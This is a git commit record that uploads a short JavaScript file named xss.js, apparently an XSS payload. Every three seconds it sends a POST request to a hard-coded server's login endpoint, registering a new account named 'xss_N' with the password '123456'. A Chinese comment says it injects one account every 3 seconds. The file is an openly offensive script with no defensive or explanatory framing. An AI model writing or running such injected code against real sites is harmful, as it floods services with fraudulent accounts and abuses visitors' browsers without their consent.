fa42b215e632acdb10affcf2cbe69822b8ddf106
riceccc114 <H1152605678@Outlook.com>
2025-04-09 00:42:03 +0100

    Add files via upload

---
+++ xss.js
@@ -0,0 +1,18 @@
+let counter = 0;
+
+function injectAccount() {
+    const xhr = new XMLHttpRequest();
+    const username = 'xss_' + counter;
+    const password = '123456';
+
+    const params = `new_account=${encodeURIComponent(username)}&new_password=${encodeURIComponent(password)}`;
+    xhr.open('POST', 'http://100.70.161.132:5000/login', true);
+    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    xhr.send(params);
+
+    counter++;
+    console.log("Injected:", username);
+}
+
+// 每 3 秒注入一个账号
+setInterval(injectAccount, 3000);
